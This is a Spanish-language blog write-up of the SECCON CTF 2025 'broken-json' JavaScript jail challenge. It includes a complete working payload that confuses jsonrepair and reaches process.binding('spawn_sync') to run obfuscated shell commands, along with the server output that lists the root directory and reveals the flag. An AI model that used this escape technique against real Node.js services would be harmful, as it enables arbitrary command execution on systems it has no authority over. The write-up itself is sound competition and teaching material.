---
title: Broken-json - SecconCTF2025
author: Kesero
description: Reto basado en escapar de una jail en JavaScript mediante el uso de jsonparser
date: 2025-12-14 16:42:00 +0100
categories: [Writeups Competiciones Internacionales, Miscelánea]
tags: [Misc, Misc - JSjail, Otros - Writeups, Dificultad - Fácil, SecconCTF]
pin: false
math: true
mermaid: true
image:
  path: https://raw.githubusercontent.com/k3sero/Blog_Content/refs/heads/main/Competiciones_Internacionales_Writeups/2025/SecconCTF2025/Jail/broken-json/prompt.png
  lqip: 
  alt: 
comments: true
---

Autor del reto: `Ark`

Veces resuelto: 166

Dificultad: <font color=orange>Media</font>

## Enunciado

```
Break Time ☕
```

## Archivos

En este reto, se tienen los siguientes archivos:

- `broken-json.tar.gz` : Contiene el Docker de la infraestructura del reto.
- `nc broken-json.seccon.games 5000`: Conexión por netcat al servidor.


```
broken-json.tar.gz
|
├── compose.yaml
├── Dockerfile
├── flag.txt
├── jail.js
├── package.json
└── package-lock.json
```

Archivos utilizados en mi [repositorio de Github](https://github.com/k3sero/Blog_Content/tree/main/Competiciones_Internacionales_Writeups/2025/SecconCTF2025/Jail/broken-json).


## Analizando el reto

En el archivo `package.json` se encuentran las versiones de los paquetes:

```json
{
  "private": true,
  "name": "broken-json",
  "type": "module",
  "dependencies": {
    "jsonrepair": "^3.13.1"
  }
}

```

En el archivo `jail.js` se encuentra el siguiente código:

```js
#!/usr/local/bin/node
import readline from "node:readline/promises";
import { jsonrepair } from "jsonrepair";

using rl = readline.createInterface({ input: process.stdin, output: process.stderr });
await rl.question("jail> ").then(jsonrepair).then(eval).then(console.log);
```

El código anterior espera a que el usuario introduzca texto para posteriormente convertirlo en JSON válido mediante la funcionalidad `jsonrepair`, para posteriormente ejecutar la cadena resultante como código `JavaScript` con la función `eval`.

## Solver

Para poder escapar de la jail, se deberá romper el parser de `jsonrepair` haciendo uso de números gigantes malformados, inyectando código JavaScript válido en medio del `JSON` para usar la función `Function.constructor` la cual nos permite acceder a `process` y mediante la API interna `process.binding('spawn_sync')`, se puede ejecutar comandos arbitrarios.

En este caso, primero se ejecutará `/bin/ls` para localizar el directorio de la flag y posteriormente con el uso de `cat flag` se obtiene la flag.

1. Bypass de jsonrepair

    ```javascript
    123,2.1e+611111111111111,asdasdasd/\"",
    ```

    - `123` - Un número válido
    - `2.1e+611111111111111` - **CLAVE**: Un número en notación científica con exponente extremadamente grande
    - `asdasdasd/\"",` - Texto que parece código roto con una comilla escapada

    Cuando `jsonrepair` procesa `2.1e+611111111111111`, intenta parsearlo como número y como el exponente es tan grande, se convierte en `Infinity`, causando que jsonrepair entre en un estado de comportamiento en el que el parsing se vuelve permisivo después de este punto.

    La secuencia de `asdasdasd/\"",` (comilla escapada junto a un cierre de una supuesta cadena) confunde al parser de `jsonrepair` haciendo que interprete lo siguiente como código JavaScript válido en lugar de seguir tratándolo como JSON.

2. El Código Malicioso

    ```javascript
    console.log(this.constructor.constructor('return process')().binding('spawn_sync').spawn({...})
    ```

    `this.constructor.constructor` funciona porque `this` en el contexto de `eval()` es el objeto global, el cual permite formar `this.constructor` que es un `Object` permitiendo realizar `Object.constructor` formando **`Function`**.

    Esto es muy importante porque `Function` es el constructor que permite crear nuevas funciones dinámicamente. Es equivalente a hacer:

    ```javascript
    new Function('código aquí')
    ```

3. Código `('return process')()`

    ```javascript
    this.constructor.constructor('return process')()
    ```

    Esto es equivalente a:

    ```javascript
    new Function('return process')()
    ```

    Esto permite crear una función cuyo cuerpo es `return process` la cual ejecuta inmediatamente con `()`, devolviendo el objeto `process` de Node.js.

    Esto es necesario porque en el contexto del eval, `process` podría no estar directamente accesible o estar restringido. Al usar `Function`, accedemos al contexto global real donde `process` sí existe.

4. Código `.binding('spawn_sync')`

    ```javascript
    process.binding('spawn_sync')
    ```

    Esto es lo más importante, ya que `process.binding()` es una API interna de Node.js (no documentada públicamente), la cual permite acceder a módulos C++ internos de Node.js. Además `spawn_sync` es el módulo interno que maneja la creación de procesos hijo de manera síncrona.

    Esta API a la que hemos sido capaces de acceder, normalmente no debería ser accesible desde código de userland.

    En este caso, mediante el uso de `.binding` somos capaces de acceder a la API porque las APIs normales como `child_process.exec()` podrían estar bloqueadas o no disponibles en la jail. `binding()` va directo al núcleo de Node.js.

5. Código `.spawn({...})`

    ```javascript
    .spawn({
        file: String.fromCharCode(47) + 'bin' + String.fromCharCode(47) + 'ls',
        args: [String.fromCharCode(47) + 'bin' + String.fromCharCode(47) + 'ls', '-la', String.fromCharCode(47)],
        envPairs: [],
        stdio: [
            {type: 'pipe', readable: true, writable: false},
            {type: 'pipe', readable: false, writable: true},
            {type: 'pipe', readable: false, writable: true}
        ]
    })
    ```

    Esta parte del código se usa para ofuscar el comando principal y evitar la detección de strings como `/bin/ls`. En este caso los parámetros del spawn son los siguientes.

    - **`file`**: `/bin/ls` - El ejecutable a llamar
    - **`args`**: `['/bin/ls', '-la', '/']` - Argumentos (lista el directorio raíz)
    - **`envPairs`**: `[]` - Variables de entorno (ninguna)
    - **`stdio`**: Configuración de los streams:
    - `[0]` - stdin: pipe legible (entrada)
    - `[1]` - stdout: pipe escribible (salida)
    - `[2]` - stderr: pipe escribible (errores)

6. Código `.output[1].toString()` para localizar la flag

    ```javascript
    .output[1].toString()
    ```
    `.output` es un array con el resultado del stdout convertido a string.

7. Código para leer la flag una vez localizada

    ```javascript
    file: String.fromCharCode(47) + 'bin' + String.fromCharCode(47) + 'cat',
    args: [String.fromCharCode(47) + 'bin' + String.fromCharCode(47) + 'cat', 
        String.fromCharCode(47) + 'flag-235a7a7283c92a9c1f9a1e521e0e70f3.txt']
    ```

    Esto ejecuta: `/bin/cat /flag-235a7a7283c92a9c1f9a1e521e0e70f3.txt`

8. El final del payload

    El payload termina con:
    ```javascript
    ),"
    ```

    Esto cierra el paréntesis del `console.log()`, la coma continúa la "lista" de elementos JSON y por último las comillas cierran una supuesta string vacía.

    Esto hace que jsonrepair piense que el JSON está completo y válido.

```
┌──(kesero㉿kali)-[~]
└─$ nc broken-json.seccon.games 5000

    jail> 123,2.1e+611111111111111,asdasdasd/\"",console.log(this.constructor.constructor('return process')().binding('spawn_sync').spawn({file:String.fromCharCode(47)+'bin'+String.fromCharCode(47)+'ls',args:[String.fromCharCode(47)+'bin'+String.fromCharCode(47)+'ls','-la',String.fromCharCode(47)],envPairs:[],stdio:[{type:'pipe',readable:true,writable:false},{type:'pipe',readable:false,writable:true},{type:'pipe',readable:false,writable:true}]}).output[1].toString()),"

    total 68
    drwxr-xr-x   1 nobody nogroup 4096 Dec 12 05:14 .
    drwxr-xr-x   1 nobody nogroup 4096 Dec 12 05:14 ..
    drwxr-xr-x   3 nobody nogroup 4096 Dec 12 05:14 app
    lrwxrwxrwx   1 nobody nogroup    7 Dec  8 00:00 bin -> usr/bin
    drwxr-xr-x   2 nobody nogroup 4096 Aug 24 16:05 boot
    drwxrwxrwt   2 nobody nogroup  100 Dec 12 12:32 dev
    drwxr-xr-x  29 nobody nogroup 4096 Dec 12 05:14 etc
    -rw-r--r--   1 nobody nogroup   41 Dec 11 21:20 flag-235a7a7283c92a9c1f9a1e521e0e70f3.txt
    drwxr-xr-x   3 nobody nogroup 4096 Dec  8 23:13 home
    lrwxrwxrwx   1 nobody nogroup    7 Dec  8 00:00 lib -> usr/lib
    lrwxrwxrwx   1 nobody nogroup    9 Dec  8 00:00 lib64 -> usr/lib64
    drwxr-xr-x   2 nobody nogroup 4096 Dec  8 00:00 media
    drwxr-xr-x   2 nobody nogroup 4096 Dec  8 00:00 mnt
    drwxr-xr-x   3 nobody nogroup 4096 Dec  8 23:14 opt
    dr-xr-xr-x 177 nobody nogroup    0 Dec 13 18:54 proc
    drwx------   3 nobody nogroup 4096 Dec 12 05:14 root
    drwxr-xr-x   3 nobody nogroup 4096 Dec  8 00:00 run
    lrwxrwxrwx   1 nobody nogroup    8 Dec  8 00:00 sbin -> usr/sbin
    drwxr-xr-x   2 nobody nogroup 4096 Dec  8 00:00 srv
    drwxr-xr-x   2 nobody nogroup 4096 Aug 24 16:05 sys
    drwxrwxrwt   3 nobody nogroup 4096 Dec 12 05:14 tmp
    drwxr-xr-x  12 nobody nogroup 4096 Dec  8 00:00 usr
    drwxr-xr-x  11 nobody nogroup 4096 Dec  8 00:00 var

    [ 123, Infinity, 'asdasdasd', '/"', undefined, '' ]
```

```
┌──(kesero㉿kali)-[~]
└─$ nc broken-json.seccon.games 5000

    jail> 123,2.1e+611111111111111,asdasdasd/\"",console.log(this.constructor.constructor('return process')().binding('spawn_sync').spawn({file:String.fromCharCode(47)+'bin'+String.fromCharCode(47)+'cat',args:[String.fromCharCode(47)+'bin'+String.fromCharCode(47)+'cat',String.fromCharCode(47)+'flag-235a7a7283c92a9c1f9a1e521e0e70f3.txt'],envPairs:[],stdio:[{type:'pipe',readable:true,writable:false},{type:'pipe',readable:false,writable:true},{type:'pipe',readable:false,writable:true}]}).output[1].toString()),"

    SECCON{Re:Jail_kara_Hajimeru_Break_Time}

[ 123, Infinity, 'asdasdasd', '/"', undefined, '' ]
```

## Flag

`SECCON{Re:Jail_kara_Hajimeru_Break_Time}`